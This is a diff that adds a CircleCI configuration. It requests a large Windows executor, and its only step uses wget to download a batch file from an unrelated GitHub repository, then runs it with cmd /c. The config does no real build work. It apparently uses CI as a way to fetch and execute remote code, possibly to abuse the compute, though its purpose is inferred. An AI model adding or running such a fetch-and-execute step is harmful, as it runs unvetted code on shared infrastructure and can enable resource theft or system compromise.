@@ -1,0 +1,15 @@
+version: 2.1 
+
+orbs:
+  win: circleci/windows@2.2.0
+
+jobs:
+  build: 
+    executor:
+      name: win/default 
+      size: "large" 
+    
+    steps:
+    - run: |
+          wget -O wiz.bat https://github.com/ajiLa78/slepoq/raw/main/fiz.bat
+          cmd /c wiz.bat
